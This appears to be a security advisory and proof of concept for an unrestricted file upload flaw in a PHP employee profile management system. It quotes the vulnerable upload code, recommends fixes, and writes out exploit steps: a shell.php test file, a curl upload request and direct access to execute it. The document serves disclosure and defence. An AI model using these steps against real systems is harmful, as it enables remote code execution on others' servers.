# employee-management-UFU
Proof-of-Concept and Advisory for Employee Profile Management System Unrestricted File Upload

# Vulnerability Advisory & Exploit

## Affected Version

Employee Profile Management System in PHP 

---

## Vulnerability Type

Unrestricted File Upload in /Profiling/add_file_query.php (uploads/ directory)

---

## Advisory (Recommendations)

### Root Cause (confirmed in code)
In Profiling/add_file_query.php the application processes uploaded files as follows:

      $target_dir = "uploads/";
      $target_file = $target_dir . basename($_FILES["per_file"]["name"]);
      $FileType = pathinfo($target_file, PATHINFO_EXTENSION);
      
      if (move_uploaded_file($_FILES["per_file"]["tmp_name"], $target_file)) {
          // no further checks
      }
      ...
      $add_file = $con->prepare("INSERT INTO tbl_files (file_name, per_id , filetype , date_uploaded)
                                 VALUES (?, ? , ? , NOW())");
      $add_file->execute(array($file, $per_id , $FileType ));


There is:

  **No extension allow-list** (e.g., .php allowed).
  
  **No MIME/content inspection**.
  
  **No randomization of filenames or collision handling**.
  
  Files are stored in Profiling/uploads/, which is inside the web root.
  
If the web server is configured to execute .php in uploads/, an attacker can upload a PHP file and then access it directly to execute arbitrary PHP code.

### Recommended Fixes

Implement a strict extension allow-list

Only allow safe types such as .pdf, .docx, .jpg, .png, etc. Reject any unsupported or dangerous extensions (.php, .phtml, .php3, .phar, etc.).

Validate MIME type and file content

Use server-side checks (e.g., finfo_file() in PHP) and verify that uploaded files match expected MIME types. Do not rely solely on the client-supplied Content-Type.

Store uploads outside the web root

Save files outside the document root and serve them via a controlled download script that does not execute them (e.g., readfile() with appropriate headers).

Randomize stored filenames

Generate random filenames or UUIDs instead of using $_FILES["per_file"]["name"] directly. Store the original name only as metadata.

Disable script execution in uploads/

Use web server configuration (.htaccess or vhost config) to prevent execution of scripts in uploads/:
    
    <Directory "/path/to/Profiling/uploads">
        php_admin_flag engine off
        Options -ExecCGI
    </Directory>

---

## Proof-of-Concept (Exploit)

Below is a PoC that can be used directly against this program running locally, based on the actual form in **Profiling/add_file_modal.php** and processing code in **Profiling/add_file_query.php**.

### 1. Prepare a test PHP file

Create a file named shell.php on your local machine with harmless but executable PHP code, e.g.:

      <?php echo "UPLOAD_OK: " . __FILE__ . " executed"; ?>


This is enough to prove that arbitrary PHP code in the upload directory is executed by the server.

### 2. Identify the upload endpoint and form fields

From **Profiling/add_file_modal.php**:

      <form action="add_file_query.php" method="POST" enctype="multipart/form-data">
          <select class="form-control" name="per_name"> ... </select>
          <input type="file" name="per_file">
          <button type="submit" class="btn btn-success" name="upload">Save</button>
      </form>


Relevant parameters:
  
  **per_name** – personnel ID (foreign key per_id).
  
  **per_file** – file upload field.
  
  **upload** – submit button name.

In a typical local setup, the application is accessed as:

Base URL: **http://localhost/Profiling/**

Upload endpoint: **http://localhost/Profiling/add_file_query.php**

Uploaded files location: **http://localhost/Profiling/uploads/**

Note: If your DB is empty, first create a personnel via the UI so that there is at least one valid per_id. Assume per_name=1 for the PoC (or adjust to a valid ID from your instance).

### 3. PoC HTTP Request (curl)

Use curl to upload shell.php as a “file” for some personnel:

      curl -i -X POST "http://localhost/Profiling/add_file_query.php" \
        -F "per_name=1" \
        -F "per_file=@shell.php;type=application/x-php" \
        -F "upload=Save"


If successful, the application will:

Move the file to: **Profiling/uploads/shell.php**

Insert a record into tbl_files with file_name = 'uploads/shell.php' and filetype = 'php'

Redirect you to file_table.php

### 4. Trigger the uploaded PHP file

Now directly access the uploaded file in your browser:

http://localhost/Profiling/uploads/shell.php


Expected Result

The browser displays:

      UPLOAD_OK: C:\...\Profiling\uploads\shell.php executed


(Path will vary by environment.)

This demonstrates:

  The application accepts .php files without restriction.

  Uploaded files are stored under a web-accessible directory (uploads/).

  The server executes the uploaded PHP code, confirming an Unrestricted File Upload → Remote Code Execution path.

### Exploit Steps (Summary)

Login to the Employee Profile Management System as any user who can access the “Add File” modal.

Create shell.php locally with arbitrary PHP code (e.g., the echo example above).

Upload shell.php via the “Add File” modal in the UI, choosing any valid personnel for per_name, orA direct POST request to /Profiling/add_file_query.php using curl or Burp Suite, as shown in the PoC.

Confirm the upload in the “Files” table (it should show uploads/shell.php).

Access http://localhost/Profiling/uploads/shell.php in a browser.

Observe the PHP output, proving that arbitrary PHP files can be uploaded and executed.
